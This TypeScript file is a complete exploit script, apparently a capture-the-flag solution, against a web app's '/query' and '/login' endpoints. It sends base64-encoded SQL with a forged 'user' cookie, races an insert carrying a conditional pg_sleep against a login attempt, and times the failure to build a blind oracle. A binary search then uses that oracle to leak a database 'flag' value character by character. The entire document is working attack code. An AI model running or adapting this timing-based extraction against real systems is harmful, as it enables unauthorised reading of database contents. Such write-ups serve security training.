import fetch from "node-fetch";
import AbortController from "abort-controller";

if (process.argv.length < 3) {
    console.log("Usage: yarn start <target uri>")
    process.exit(1);
}
const target = process.argv[2];

/**
 * [tryExp] works by taking an arbitrary SQL expression, and embedding it into a sequence of
 * statements that does the following
 *
 *  - Inserts into _pgui.login with an entry that will correspond to the next natural insertion
 *    as per the [serial] key. This sequence is called '_pgui.login_id_seq'.
 *  - Sleeps for 2 seconds if the expression evaluates to true, and sleeps for 0 seconds otherwise
 *
 * Then it tries to login. If the first thread is still sleeping, then it's previous insertion
 * will conflict with the insertion that happens during login as per the `UNIQUE` constraint
 *
 * Finally, once login fails, it times how long it took to fail. If it was approximately 2 seconds,
 * then we infer that the criterion was met, and return true. Otherwise we return false.
 */
const tryExp = async (exp: string) => {
    let query = Buffer.from(`
INSERT INTO _pgui.login (id, username)
SELECT nextval('_pgui.login_id_seq')+1, 'admin'
RETURNING pg_sleep (
    CASE WHEN (${exp}) THEN 2 ELSE 0 END
);
    `).toString("base64");

    const controller = new AbortController();

    (async () => {
        try {
            await fetch(target + "/query", {
                method: "POST",
                headers: {
                    "cookie": "user=zach.is.cool",
                    "content-type": "application/json",
                },
                signal: controller.signal,
                body: JSON.stringify({ query }),
            });
        } catch (e) {
            // pass
        }
    })()

    let start = Date.now();

    await fetch(target + "/login", {
        method: "POST",
        headers: {
            "content-type": "application/json",
        },
        body: JSON.stringify({ username: "admin", password: "foo" }),
    });

    let end = Date.now();

    controller.abort();

    if (end - start > 1000) {
        return true;
    } else {
        return false;
    }
}

/**
 * [binCond] uses the [tryExp] method to create a binary condition to use for
 * binarySearch. Specifically, it checks to see if the character at [chr] is less
 * than the value provided by mid.
 */
const binCond = async (chr: number, mid: number) => {
    let exp = `(ascii(substr((select flag from flag), ${chr}, 1))) < ${mid}`;

    // There's a bit of a race, but fortunately it only goes in the direction of
    // false negatives, so we just try 3 times for stability
    return (await tryExp(exp)) || (await tryExp(exp)) || (await tryExp(exp));
}

/**
 * [binSearch] is just a run-of-the-mill binary search function that uses
 * the above primitive.
 */
const binSearch = async (pos: number) => {
    let lower = 0;
    let upper = 256;

    while (upper - lower > 1) {
        let mid = Math.floor((upper - lower) / 2) + lower;
        let result = await binCond(pos, mid)
        if (result) {
            upper = mid;
        } else {
            lower = mid;
        }
    }

    return String.fromCharCode(lower);
}

/**
 * Main will invoke our binary search to leak the contents of the flag, one character
 * at a time. In my experience, it takes around 5 seconds per character.
 */
const main = async() => {
    let result = ""
    while (true) {
        result += await binSearch(result.length + 1);
        console.log(result);
    }
}

main();